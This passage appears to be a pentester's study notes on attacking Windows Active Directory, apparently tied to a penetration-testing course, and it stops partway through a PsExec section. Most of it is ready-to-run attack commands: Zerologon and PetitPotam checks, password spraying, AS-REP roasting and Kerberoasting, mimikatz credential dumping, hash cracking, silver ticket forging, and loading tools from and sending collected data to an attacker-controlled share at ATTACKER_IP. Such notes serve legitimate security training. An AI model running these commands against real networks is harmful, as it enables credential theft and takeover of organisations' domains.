
# 5 Active Directory

*Active Directory (AD)* is how Windows enterprise networks are managed. Everything in the network (computers, users, shares, etc.) is represented in AD as an object. Objects are organized under a hierarchical set of *Organizational Units (OUs)*, which act like folders in a filesystem. The *Domain Controller (DC)* is the central server that manages everything, especially access and authentication in the network. The information on the DC gives an attacker full visibility into and control of an AD Domain. The goal is to take over the DC as SYSTEM.

Members of the *Domain Admins* group have administrative privileges on the DC, so they are key targets. Large enterprises group multiple AD domains into a tree, and some go further, grouping trees into an AD forest. *Enterprise Admins* have full administrative rights over all DCs in the entire AD forest, and are the most valuable user accounts to compromise.

The *Primary Domain Controller (PDC)* is the master, and there can be only one in a domain. It's the one with the *PdcRoleOwner* property. This is the best DC to use when querying for domain information because it's the most up-to-date.

*Lightweight Directory Access Protocol (LDAP)* is the protocol used to query and communicate with Active Directory. To communicate to a host (DC) using LDAP, we need to use it's Active Directory Services Path (ADSPath), which looks like:

```
LDAP://HostName[:PortNumber][/DistinguishedName]
```

We need three parameters for a full LDAP path: _HostName_ (hostname, domain name, or IP), _PortNumber_ (usually defaults are fine), and a _DistinguishedName (DN)_.

A DistinguishedName is basically a full domain name, split on periods with "DC=", "OU=", or "CN=" inserted before each component. "DC" is the Domain Component, "OU" is the Organizational Unit, and "CN" is the Common Name (an object identifier). For example: `CN=Stephanie,CN=Users,DC=corp,DC=com` could translate to the domain name `stephanie.users.corp.com`. Note that domain names in AD can represent any object in the  AD domain (users included).

In Windows, *Active Directory Services Interface (ADSI)* is a set of COM interfaces that acts as an LDAP provider for programatic communication over LDAP (e.g. via .NET/PowerShell).

When trying to access an object (like a share drive) in AD, permissions are managed by *Access Control Lists (ACLs)*, which are composed of *Access Control Entries (ACEs)*. ACEs can be configured to provide many different **permission types**. From an attacker perspective, these are the most interesting ones:
- *GenericAll*: Full permissions over object
- *GenericWrite*: Edit certain attributes of the object
- *WriteOwner*: Change ownership of the object
- *WriteDACL*: Edit ACE's applied to object
- *AllExtendedRights*: Change password, reset password, etc.
- *ForceChangePassword*: Password change for object
- *Self* (Self-Membership): Add ourselves to, for example, a group


## 5.1 Active Directory Enumeration

Checklist:
- [ ] Known DC vulnerabilities:
	- [ ] Zerologon
	- [ ] PetitPotam
	- [ ] NoPAC (once you have a user's creds)
- [ ] Kerberoastable accounts
- [ ] AS-REP Roastable accounts
- [ ] Find computers where Domain Users can RDP
- [ ] Find computers where Domain Users are Local Admin
- [ ] Shortest Path to Domain Admins (esp. from Owned Principals)
- [ ] Write-permissions on any critical accounts?
- [ ] Enumerate:
	- [ ] Users (interesting permissions)
	- [ ] Groups (memberships)
	- [ ] Services (which hosts? users w/ SPNs?)
	- [ ] Computers (which ones have useful sessions?)

When you start your internal pentest, these are the first modules you should try:

```sh
# Zerologon
crackmapexec smb DC_IP -u '' -p '' -M zerologon

# PetitPotam
crackmapexec smb DC_IP -u '' -p '' -M petitpotam

# NoPAC (requires credentials)
crackmapexec smb DC_IP -u 'user' -p 'pass' -M nopac
```


Before starting enumeration, get the tools you might need ready:

```sh
# WinPEAS for automated Windows enumeration
wget -O winpeas.exe https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe

# PowerUp for Winodws privilege escalation
cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1 .

# PowerView for manual AD enumeration
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .
chmod -x PowerView.ps1

# SharpHound for automated AD enumeration
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1

# sysinternals suite in case you need it
wget -O sysinternals.zip https://download.sysinternals.com/files/SysinternalsSuite.zip
unzip -d sysinternals sysinternals.zip

# Invoke-Mimikatz.ps1 and mimikatz.exe for hashes/tokens
cp /usr/share/windows-resources/powersploit/Exfiltration/Invoke-Mimikatz.ps1 .
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe ./mimikatz32.exe
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./mimikatz64.exe
wget -O mimikatz.zip https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
unzip -d mimikatz mimikatz.zip

# Rubeus.exe for AS-REP roasting, etc.
wget -O Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe

# windapsearch for LDAP enumeration
wget -O windapsearch https://github.com/ropnop/go-windapsearch/releases/latest/download/windapsearch-linux-amd64
chmod +x windapsearch

# plink.exe for port redirection/tunneling
cp /usr/share/windows-resources/binaries/plink.exe .
chmod -x plink.exe

# nc.exe for reverse/bind shells and port redirection
cp /usr/share/windows-resources/binaries/nc.exe .
chmod -x nc.exe

# chisel for port redirection/tunneling
/mnt/share/cheat/tools/get-chisel.sh || (
	echo 'DOWNLOAD chisel!'
	echo 'https://github.com/jpillora/chisel/releases'
)

# host the files on a Windows 10+ compatible SMB share
impacket-smbserver -smb2support -user derp -password herpderp share .
```

Manual enumeration commands:

```powershell
# What Active Directory Domain you belong to
wmic computersystem get domain
systeminfo | findstr /B /C:"Domain"

# Which Domain Controller you're authenticated to (logonserver)
set l
nltest /dsgetdc:DOMAIN.TLD

# View Domain Users
net user /domain

# View info about specific domain user
net user derpadmin /domain

# View Domain Groups
net group /domain

# View Members of specific Domain Group
# (examples are valuable default groups)
net group /domain "Domain Admins"
net group /domain "Enterprise Admins"
net group /domain "Domain Controllers" # which machines the DCs are
net group /domain "Domain Computers" # all computers in the domain
net group /domain "Administrators"
net group /domain "Remote Desktop Users"
net group /domain "Remote Management Users"

# View high-level info about current domain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# view info about primary DC
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner

# look up info on specific service account
setspn -L iis_service
```

One-liner to list local administrators on another computer (you must be admin of that computer to do so):

```powershell
# change COMPUTERNAME to whatever
Get-CimInstance -Computer COMPUTERNAME -Class Win32_GroupUser|?{$_.GroupComponent.Name -eq "Administrators"}|%{$_.PartComponent.Name}
```

Here's a quick script to list the local administrators of all hosts in a domain:

```powershell
$LocalGroup = 'Administrators'
$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;
$dn=([adsi]'').distinguishedName
$p=("LDAP://"+$pdc.Name+"/"+$dn);
$d=New-Object System.DirectoryServices.DirectoryEntry($p)
$s=New-Object System.DirectoryServices.DirectorySearcher($d)
$s.filter="(objectCategory=computer)"
$computers=$s.FindAll()|%{$_.Properties.cn}
foreach ($c in $computers) {
  echo "`r`n==========   $c   =========="
  try {
    $grp=[ADSI]("WinNT://$c/$LocalGroup,Group")
    $mbrs=$grp.PSBase.Invoke('Members')
    $mbrs|%{$_.GetType().InvokeMember('Name','GetProperty',$null,$_,$null)}
  } catch {
    echo "[x] ERROR retrieving group members"
    continue
  }
}
```


### 5.1.1 Quick Active Directory Enumeration Script

This script will provide a quick listing of all computers, users, service
accounts, groups and memberships on an Active Directory domain.

This script was adapted from one written by Cones, who modified the example code provided in the PWK course materials.

```powershell
$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;
$dn=([adsi]'').distinguishedName
$p=("LDAP://"+$pdc.Name+"/"+$dn);
$d=New-Object System.DirectoryServices.DirectoryEntry($p)
$s=New-Object System.DirectoryServices.DirectorySearcher($d)
write-host "==========    PRIMARY DC    ==========";
$pdc|select Name,IPAddress,OSVersion,SiteName,Domain,Forest|format-list
write-host "==========    COMPUTERS    ==========";
$s.filter="(objectCategory=computer)";$s.FindAll()|?{write-host $_.Path};
write-host "==========    USERS    ==========";
$s.filter="(objectCategory=person)";$s.FindAll()|?{write-host $_.Path};
write-host "==========    SERVICES    ==========";
$s.filter="(serviceprincipalname=*)";$s.FindAll()|?{write-host $_.Path};
write-host "==========    GROUPS    ==========";
$s.filter="(objectCategory=group)";$s.FindAll()|?{write-host $_.Path};
write-host "==========    MEMBERSHIP    ==========";
function _r {
  param($o,$m);
  if ($o.Properties.member -ne $null) {
    $lm=[System.Collections.ArrayList]@();
    $o.Properties.member|?{$lm.add($_.split(",")[0].replace("CN=",""))};
    $lm=$lm|select -unique;
    $m.add((New-Object psobject -Property @{
      OU = $o.Properties.name[0]
      M = [string]::Join(", ",$lm)
    }));
    $lm | ?{
      $s.filter=[string]::Format("(name={0})",$_);
      $s.FindAll()|?{_r $_ $m | out-null};
    }
  }
}
$m=[System.Collections.ArrayList]@();
$s.FindAll()|?{_r $_ $m | out-null};
$m|sort-object OU -unique|?{write-host ([string]::Format("[OU] {0}: {1}",$_.OU,$_.M))};
```


### 5.1.2 Domain Enumeration with PowerView

PowerView is a PowerShell script that makes enumerating Active Directory much easier. To see a list of all available functions, see the [documentation](https://powersploit.readthedocs.io/en/latest/Recon/).

To get a copy on Kali for transfer to your victim:

```sh
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .

# also grab sysinternals suite in case you need it
wget https://download.sysinternals.com/files/SysinternalsSuite.zip
unzip -d sysinternals SysinternalsSuite.zip

impacket-smbserver -smb2support -user derp -password herpderp share .
```

Usage (some commands may take a minute or two to complete):

```powershell
# stop complaints about running downloaded scripts
powershell -ep bypass

# connect to attacker SMB share
net use \\ATTACKER_IP herpderp /user:derp

# load all the functions from PowerView into your session
Import-Module \\ATTACKER_IP\share\PowerView.ps1

# basic info about the current domain
Get-Domain

# list all domain controllers
Get-DomainController


# List AS-REP Roastable users
Get-DomainUser -PreauthNotRequired | select samaccountname
# Kerberoast all kerberoastable users
Invoke-Kerberoast | fl
# Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts. (takes time)
Invoke-UserHunter -CheckAccess
# complete information about a single user to view available fields
Get-NetUser | Select -First 1
# complete information about specific user
Get-NetUser USERNAME
# list of all usernames with last logon and password set times
Get-NetUser | select samaccountname,pwdlastset,lastlogon

# list of all service accounts, or Service Principal Names (SPNs)
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# Find interesting ACLs (takes time)
Invoke-ACLScanner -ResolveGUIDs | select IdentityReferenceName,ObjectDN,ActiveDirectoryRights | fl
# list of all ACEs (permissions) for specific user
Get-ObjectAcl -Identity USER_OR_GROUP_NAME
# filter list for "interesting" permissions
Get-ObjectAcl -Identity "Management Department" | ? {"GenericAll","GenericWrite","WriteOwner","WriteDACL","AllExtendedRights","ForceChangePassword","Self" -eq $_.ActiveDirectoryRights} | % {[pscustomobject]@{Name=$_.SecurityIdentifier|Convert-SidToName;Permissions=$_.ActiveDirectoryRights}}

# convert SID to name (useful for translating Get-ObjectAcl output)
Convert-SidToName SID

# list of all group names
Get-NetGroup | select samaccountname,description
# all members of specific group
Get-DomainGroupMember "Domain Admins" | select membername

# enumerates the local groups on the local (or remote) machine
# same as 'net localgroup' command, but for remote computers
Get-NetLocalGroup -ComputerName NAME

# list all computers
Get-DomainComputer | select dnshostname,operatingsystem,operatingsystemversion
# get all IP addresses and hostnames
resolve-ipaddress @(Get-DomainComputer|%{$_.dnshostname})
# get IP of specific computer
Resolve-IPAddress -ComputerName NAME

# finds machines on the local domain where the current user has local administrator access
Find-LocalAdminAccess
# finds reachable shares on domain machines
Find-DomainShare
Find-DomainShare -CheckShareAccess|fl # only list those we can access
# finds domain machines where specific users are logged into
Find-DomainUserLocation
# enumerates the members of specified local group on machines in the domain
Find-DomainLocalGroupMember
# finds domain machines where specific processes are currently running
Find-DomainProcess

# returns users logged on the local (or a remote) machine
Get-NetLoggedon
# enumerates members of a specific local group on the local (or remote) machine
Get-NetLocalGroupMember
# returns open shares on the local (or a remote) machine
Get-NetShare
# returns session information for the local (or a remote) machine
# queries registry key: HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\SrvsvcSessionInfo
# which is locked down to Admins starting with Win10-1709 and Server2019-1809, so won't work
Get-NetSession -ComputerName NAME -Verbose
# if Get-NetSession doesn't work, try PsLoggedon.exe from Sysinternals
# (requires Remote Registry service to be enabled):
.\PsLoggedon.exe \\HOSTNAME

# list all sites in domain
Get-DomainSite | select cn
# list all subnets
Get-DomainSubnet
```


### 5.1.3 Domain Enumeration with BloodHound

BloodHound lets you perform graph-analysis on Active Directory to map out the domain and find attack paths. Its companion, SharpHound, performs the preliminary data collection on a Windows domain host.

On the victim machine:

```powershell
# stop complaints about running downloaded scripts
powershell -ep bypass

# connect to attacker SMB share
net use \\ATTACKER_IP herpderp /user:derp

# load all the functions from SharpHound into your session
Import-Module \\ATTACKER_IP\share\SharpHound.ps1

# collect all the data (except local group policies)
Invoke-BloodHound -CollectionMethod All -OutputDirectory \\ATTACKER_IP\share -ZipFileName "derphound.zip"
```

On the attacker machine:

```sh
# start the neo4j server
sudo neo4j start

# browse to neo4j webUI to configure a password
firefox http://localhost:7474
# log in with neo4j:neo4j
# and change password to whatever you want (remember for later!)

# now that neo4j is running, start bloodhound
bloodhound
# configure it to log into local neo4j server using approriate URL and creds
# URL: bolt://localhost:7687
```

Upload your zip file by clicking the "Upload Data" button from the top-right set of menu buttons (looks like an up arrow in a circle), and wait for database to get updated.

Go to the Analysis tab under the search bar's hamburger menu.

![](assets/bloodhound-analysis-tab.png)

The _Find Shortest Paths to Domain Admins_ query is a very handy one:

![](assets/bloodhound-shortest-path-domain-admin.png)

Clicking on any node brings up its "Node Info" tab under the search bar, which contains lots of details about the node.

💡 **TIP**: It's a good idea to check the details of users/groups/computers you control. Especially look at the *Outbound Object Control* and *Local Admin Rights*.

If you right-click an edge (line) between two nodes and click `? Help`, BloodHound will show additional information:

![](assets/bloodhound-link-help.png)

In the same Help modal, check out the *Abuse* tab for tips on how to exploit this link.

The _Shortest Paths to Domain Admins from Owned Principals_ query is also amazing. Before you use it, you must right-click on every node that you "own" (e.g. user accounts, computers), and mark it as owned.

Alternatively, you can right-click on any node and click "Shortest Paths To Here".

There are four **keyboard shortcuts** when the graph rendering area has focus:

- <kbd>Ctrl</kbd>: Cycle through the three different node label display settings - default, always show, always hide.
- <kbd>Space</kbd>: Bring up the spotlight window, which lists all nodes that are currently drawn. Click an item in the list and the GUI will zoom into and briefly highlight that node.
- <kbd>Backspace</kbd>: Go back to the previous graph result rendering. This is the same functionality as clicking the Back button in the search bar.
- <kbd>s</kbd>: Toggle the expansion or collapse of the information panel below the search bar. This is the same functionality as clicking the More Info button in the search bar.

You can constrain your searches in the search bar with tags for the node-type like `user:WHATEVER`. Allowed tags/node-types are:
- Group
- Domain
- Computer
- User
- OU
- GPO
- Container

From the search bar, you can also click the "Pathfinding" button (looks like a road into the distance) to tell it to search from/to the node you select from the search.

💡 **TIP**: [`bloodhound.py`](https://github.com/fox-it/BloodHound.py) (unofficial tool) lets you collect/ingest most of the same active directory information as SharpHound, but you can run it straight from your Kali box. It requires at least a domain user's credentials and the ability to reach/query the appropriate DC.

When you're finished with BloodHound, clear the database by going to the search bar's hamburger menu > Database Info tab, scroll to bottom and click "**Clear Database**" button.


## 5.2 Attacking Active Directory Authentication

Kerberos is the "preferred" (default and most secure) authentication method in Active Directory. Other methods include LM (LAN Manager), NTLM (New Technology LAN Manager), and NTLMv2. LM and NTLM are legacy protocols disabled by default in modern systems, but they are provided for backwards compatibility. For the rest of this section, I'll refer to NTLMv2 as NTLM.

Microsoft **Kerberos** (based on MIT's Kerberos version 5) has been used as the default authentication mechanism since Windows Server 2003. It is a stateless ticket-based authentication system, where clients get "tickets" (cryptographically secured data containing access permissions) from the _Key Distribution Center (KDC)_. Application servers verify the client's ticket before granting access to AD objects. The Domain Controller performs the role of KDC in Active Directory. The KDC consists of two services, the *Authentication Server (AS)* and the *Ticket Granting Service (TGS)*. Each is used in a separate stage of the Kerberos authentication process.

There are three stages/phases Kerberos authentication:
1. Client obtains a *Ticket Granting Ticket (TGT)* from the KDC's AS. This happens at initial logon and when the TGT is about to expire.
2. Client uses its TGT to request a *service ticket* (permission to access a specific service) from the KDC's TGS.
3. Client uses the service ticket to access the desired service on an application server.

The detailed steps to obtain a TGT from the AS are:
1. Client sends _Authentication Server Request (AS-REQ)_ to KDC's AS. AS-REQ contains username and an encrypted timestamp (to prevent replay attacks). The timestamp is encrypted with the NT hash (i.e. unsalted MD4 hash) of user's password.
2. KDC's AS decrypts timestamp using user's password hash stored in the **`ntds.dit`** file. If decrypted timestamp matches current time (and isn't duplicate), the KDC sends an _Authentication Server Reply (AS-REP)_ to the client. AS-REP contains a _session key_ and a _Ticket Granting Ticket (TGT)_
	- session key has HMAC encrypted with user's NT hash for their use later.
	- TGT contains information about user, domain, IP of client, timestamp, and session key.
	- To avoid tampering, the TGT is encrypted by a secret key (NTLM hash of the *`krbtgt`* account) known only to the KDC and cannot be decrypted by the client.
	- TGT valid for 10 hours by default, with automatic renewal

When the client wants to access a service in the domain (e.g. share drive, email), the client must first request a service ticket from the KDC. The steps are:
1. Client sends _Ticket Granting Service Request (TGS-REQ)_ to KDC's TGS. TGS-REQ contains the name of requested service/resource (known as the *Service Principal Name (SPN)* in AD), the TGT (still encrypted with `krbtgt`'s hash), and encrypted username and timestamp (both encrypted with session key).
2. KDC performs multiple actions/checks to verify the TGS-REQ:
	1. Checks requested resource exists
	2. Decrypts TGT, extracts session key
	3. Decrypts username and timestamp with session key
	4. Checks valid timestamp (matches current time, not duplicate)
	5. Checks username of TGT and TGS-REQ match
	6. Checks IP of client matches IP from TGS
	- NOTE: the KDC does NOT check that the user is allowed access to the service. This function is performed by the SPN itself. This opens the door for a Kerberoasting attack.
3. Assuming checks pass, KDC sends client _Ticket Granting Server Reply (TGS-REP)_, containing name of service with access granted, session key for use between client and service, and a _service ticket_ containing the username and group memberships along with the newly-created session key.
	- The service name and service-session key are encrypted with the TGT-session key for client to use.
	- The service ticket is encrypted using the password hash of the SPN registered for the service in question.

Finally, the client can request access to the service from the application server:
1. Client sends server _Application Request (AP-REQ)_, which includes service ticket and the encrypted username and timestamp (encrypted with the service-session key)
2. Application server performs several actions/checks to verify the AP-REQ:
	1. Decrypts the service ticket using its service account password hash
	2. Extracts username and session key from service ticket
	3. Uses session key to decrypt username and timestamp
	4. Checks valid timestamp
	5. Checks username of service ticket matches decrypted one from AP-REQ
3. Assuming checks pass, the client is granted access to the service

**NTLM** (NTLMv2) authentication is a challenge-and-response system. NTLM is a fast hashing algorithm for authentication, so it can easily be cracked. These are the steps for NTLM authentication:
1. Client calculates the cryptographic NTLM hash from the user's password
2. Client sends username to (application) server
3. Server sends nonce to client
4. Client encrypts nonce with NTLM hash and sends result to server
5. Server forwards encrypted nonce, nonce and username to DC
6. DC encrypts nonce with stored NTLM hash of user and checks against supplied encrypted nonce
7. If two encrypted nonces match, DC sends authentication verified message to server

NTLM authentication is used in 3 cases in Active Directory:
- when a client authenticates to a server by IP address (instead of by hostname)
- if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server
- third-party applications may choose to use NTLM authentication instead of Kerberos

In modern versions of Windows, the NTLM hashes/Kerberos tokens are cached in the Local Security Authority Subsystem Service (LSASS) memory space, so we can steal them using Mimikatz. To steal tickets, **make sure you interact with the target service first** (e.g. list directory of share)!

Microsoft provides the AD role _Active Directory Certificate Services (AD CS)_ to implement a PKI, which exchanges digital certificates between authenticated users and trusted resources. If a server is installed as a _Certification Authority (CA)_ it can issue and revoke digital certificates (and much more). This can be abused to defeat active directory authentication that relies on PKI, including Smart Cards.


### 5.2.1 Change Active Directory Credentials

If you have `GenericAll` (or `Self`) permissions over any user in Active Directory, you can change that user's password. This is one way to privesc or move laterally in an Active Directory domain.

To change the password of a user on a Windows AD domain:

```powershell
# simple way
net user /domain USERNAME PASSWORD

# powershell way
Set-ADAccountPassword -Identity someuser -OldPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd" -Force) -NewPassword (ConvertTo-SecureString -AsPlainText "qwert@12345" -Force)
```



### 5.2.2 Password Spraying in Active Directory

```powershell
# check account policy's password lockout threshold
net accounts
```

See the simple [`Spray-Passwords.ps1`](tools/win/Spray-Passwords.ps1) script, which is based on an expansion of this idea:

```powershell
$pdc=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner;
$dn=([adsi]'').distinguishedName
$p=("LDAP://"+$pdc.Name+"/"+$dn);
$d=New-Object System.DirectoryServices.DirectoryEntry($p,"USERNAME","PASSWORD")
```

Use the script like so:

```powershell
.\Spray-Passwords.ps1 -Admin -Pass "PASSWORD"
```

Alternatively, use **CrackMapExec**, which has bonus of showing whether user is Admin on target by adding `Pwn3d!` to output. NOTE: CME does not throttle requests, so watch out for account lockout.

```sh
# check list of usernames against single host
crackmapexec smb -u users.txt -p 'PASSWORD' --continue-on-success -d DOMAIN VICTIM_IP

# (assuming you know password) check which machines user(s) can access and has admin on.
# For admin, look for '(Pwn3d!)'
crackmapexec smb -u USERNAME -p 'PASSWORD' --continue-on-success -d DOMAIN CIDR_OR_RANGE
```

Another option is **Kerbrute**:

```sh
# fetch kerbrute
wget -O kerbrute32.exe https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_386.exe
wget -O kerbrute64.ese https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe
wget -O kerbrute https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute

# on linux
./kerbrute passwordspray -d DOMAIN ./usernames.txt 'PASSWORD' --dc DOMAIN_IP

# on windows
.\kerbrute64.exe passwordspray -d DOMAIN .\usernames.txt "PASSWORD"
# if you receive a network error, make sure that the encoding of usernames.txt is ANSI.
# You can use Notepad's Save As functionality to change the encoding.
```


### 5.2.3 AS-REP Roasting

AS-REP Roasting is an attack to retrieve a user's password hash that can be brute-forced offline.

Normally when requesting a TGT, a client must prove its identity by encrypting the timestamp with it's hashed password in the AS-REQ. This is known as *Kerberos Preauthentication*. However, some services require turning preauthentication off (by enabling the _Do not require Kerberos preauthentication (i.e. DONT_REQ_PREAUTH)_ option) in order to function. This means that they (or any attacker) can request a TGT without submitting an encrypted timestamp, and the server will respond with a properly-encrypted TGT. Because the session key contains an HMAC encrypted with the user's hash, we can brute force this offline. Under the hood, the attack also weakens the crypto by requesting RC4 as the only allowable cipher for the HMAC (vs. the default of AES256-CTS).

Enumerating for users that are AS-REP Roastable:

```powershell
# Windows: using PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname

# Microsoft standard way of looking for users with 
# "Do not require Kerberos Preauthentication" option set (hex 0x400000 = 4194304)
# requires ActiveDirectory module to be loaded
Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | fl

# Kali: using impacket (specify user info for authentication to DC)
impacket-GetNPUsers -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
```

Collecting hashes using AS-REP Roast attack:

```powershell
# Windows: use Rubeus.exe (can use /format:hashcat interchangably)
.\Rubeus.exe asreproast /format:john /outfile:asreproast.hash
# push to stdout instead of file
.\Rubeus.exe asreproast /nowrap

# Kali: using crackmapexec, automatically finds all AS-REP Roastable users & grabs hashes
crackmapexec ldap VICTIM -u USERNAME -p PASSWORD --asreproast asreproast.hash

# Kali: use impacket (specify user info for authentication to DC)
impacket-GetNPUsers -request -outputfile asreproast.hash -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
```

Cracking the AS-REP roast hashes:

```sh
# using John-the-Ripper (auto-detects krb5asrep format)
john --wordlist=/usr/share/wordlists/rockyou.txt asreproast.hash

# using hashcat
hashcat -m 18200 --force -r /usr/share/hashcat/rules/best64.rule asreproast.hash /usr/share/wordlists/rockyou.txt
```

If you have write permissions for another user account (e.g. `GenericAll`), then, instead of changing their password, you could momentarily set their account to disable Preauth, allowing you to AS-REP roast their account. Here's how:

```powershell
# using Microsoft ActiveDirectory Module
get-aduser -identity $USERNAME | Set-ADAccountControl -doesnotrequirepreauth $true

# using AD Provider
$flag = (Get-ItemProperty -Path "AD:\$DISTINGUISHED_NAME" -Name useraccountcontrol).useraccountcontrol -bor 0x400000
Set-ItemProperty -Path "AD:\$DISTINGUISHED_NAME" -Name useraccountcontrol -Value "$flag" -Confirm:$false

# using ADSI accelerator (legacy, may not work for cloud-based servers)
$user = [adsi]"LDAP://$DISTINGUISHED_NAME"
$flag = $user.userAccountControl.value -bor 0x400000
$user.userAccountControl = $flag
$user.SetInfo()
```


### 5.2.4 Kerberoasting

Kerberoasting is an attack to retrieve the password hash of a Service Principal Name (SPN) that can be brute-forced offline.

When requesting the service ticket from the KDC, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN. These checks are performed only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. The service ticket's HMAC is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt the HMAC using brute force or guessing, we can use this information to crack the cleartext password of the service account. This is known as Kerberoasting. It is very similar to AS-REP Roasting, except it is attacking SPNs' hashes instead of users'.

Obtaining the SPN Hashes:

```powershell
# Windows: using PowerView.ps1
Invoke-Kerberoast | fl

# Windows: using Rubeus
# '/tgtdeleg' tries to downgrade encryption to RC4
.\Rubeus.exe kerberoast /tgtdeleg /outfile:kerberoast.hash

# Kali: use crackmapexec, auto-finds all kerberoastable users & grabs hashes
crackmapexec ldap VICTIM_IP -u harry -p pass --kerberoasting kerberoast.hash

# Kali: use impacket
impacket-GetUserSPNs -request -outputfile kerberoast.hash -dc-ip DC_IP DOMAIN/USERNAME:PASSWORD
```

Cracking the kerberoast hashes:

```sh
# using John-the-Ripper (auto-detects krb5tgs format)
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.hash

# using hashcat
hashcat -m 13100 --force -r /usr/share/hashcat/rules/best64.rule kerberoast.hash /usr/share/wordlists/rockyou.txt
```

If the SPN runs in the context of a computer account, a managed service account, or a group-managed service account, the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the `krbtgt` user account which acts as service account for the KDC.

If you have write permissions for another user account (e.g. `GenericAll`), then, instead of changing their password, you could momentarily add/register an SPN to their account, allowing you to kerberoast them.

Once you have the SPN password, you can use it to forge a Silver Ticket. You must first convert it to its NTLM hash, which is simply the MD4 hash of the password.

```python
import hashlib
h = hashlib.new("md4", "SPN_PASSWORD".encode("utf-16le")).hexdigest()
print(h)
```



### 5.2.5 Silver Ticket

A Silver Ticket is a forged service ticket that an attacker uses to gain access to a service.

Privileged Account Certificate (PAC) validation is an optional verification process between the SPN application and the DC. If this is enabled, the user authenticating to the service and its privileges are validated by the DC. Fortunately for this attack technique, service applications rarely perform PAC validation.

That means that an attacker with the SPN password (see [Kerberoasting](#5.2.4%20Kerberoasting)) or its NTLM hash can forge a service ticket for any user with whatever group memberships and permissions the attacker desires, and the SPN will commonly blindly trust those permissions rather than verify them with the DC.

We need to collect the following three pieces of information to create a silver ticket:

- SPN password hash (can get with mimikatz when SPN has session on your computer)
- Domain SID (extract from user SID)
- Target SPN

More info: [HackTricks - Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)

Getting prerequisite info:

```powershell
# use mimikatz to get SPN NTLM hash
mimikatz.exe
> privilege::debug
> sekurlsa::logonpasswords

# mimikatz one line
mimikatz.exe "token::elevate" "privilege::debug" "sekurlsa::logonpasswords" exit

# extract the Domain SID from the user SID (everything but RID, numbers after last dash)
whoami /user

# list SPNs from specific host
setspn -l HOSTNAME
# example for IIS server: HTTP/web04.corp.com:80
```

Create silver ticket (you can use any valid username):

```powershell
# in mimikatz:
# /ptt - pass the ticket; auto-injects it into memory
kerberos::golden /sid:S-1-5-... /domain:DOMAIN /ptt /target:SERVER_FQDN /service:http /rc4:NTLM_HASH /user:ADMIN_USER

# TODO: figure out how to do this with Rubeus.exe
# Rubeus lets you ask for tickets for all services at once:
# /altservice:host,rpcss,http,wsman,cifs,ldap,krbtgt,winrm
.\Rubeus.exe silver /rc4:NTHASH /user:USERNAME /service:SPN /ldap /ptt [/altservice:host,rpcss,http,wsman,cifs,ldap,krbtgt,winrm] [/nofullpacsig] [outfile:FILENAME]

# Kali: get SIDs with crackmapexec
crackmapexec ldap DC_FQDN -u USERNAME -p PASSWORD -k --get-sid

# Kali: use impacket
# Service is something like http, cifs, host, ldap, etc. (cifs lets you access files)
impacket-lookupsid DOMAIN/USERNAME:PASSWORD@VICTIM
impacket-ticketer -nthash NTHASH -domain-sid S-1-5-21-.... -domain DOMAIN -spn SERVICE/VICTIM_FQDN USERNAME
export KRB5CCNAME=$(pwd)/USERNAME.ccache 
impacket-psexec DOMAIN/USERNAME@VICTIM -k -no-pass
```

Confirm ticket is loaded in memory on Windows host:

```powershell
# list kerberos tickets available to user
klist

# make web request with silver ticket
iwr -UseDefaultCredentials http://VICTIM
```

Before 11 October 2022, it was possible to forge Silver tickets for nonexistent users. That's no longer the case, due to a security patch that adds the `PAC_REQUESTOR` field to the Privilege Attribute Certificate (PAC) structure. The field contains the username, and it is required to be validated by the DC (when patch is enforced).

## 5.3 Lateral Movement in Active Directory

Pass-the-Hash (PtH) only works for servers using NTLM authentication (not Kerberos only). Authentication is performed using an SMB connection, so port 445 must be open, the Windows File and Printer Sharing feature to be enabled (it is by default), and the `ADMIN$` share to be available. It also requires local administrator rights. Most tools that are built to abuse PtH can be leveraged to start a Windows service (for example, cmd.exe or an instance of PowerShell) and communicate with it using Named Pipes. This is done using the Service Control Manager API.



### 5.3.1 PsExec on Active Directory

PsExec allows you to run remote processes as a child of a Windows service process, meaning you get SYSTEM privileges.

Prerequisites: The user that authenticates to the target machine needs to be part of the *Administrators* local group. In addition, the _ADMIN$_ share must be available and File and Printer Sharing must be turned on (this is default).

PsExec is part of the Sysinternals suite, and performs the following tasks:
- Writes `psexesvc.exe` into the `C:\Windows` directory
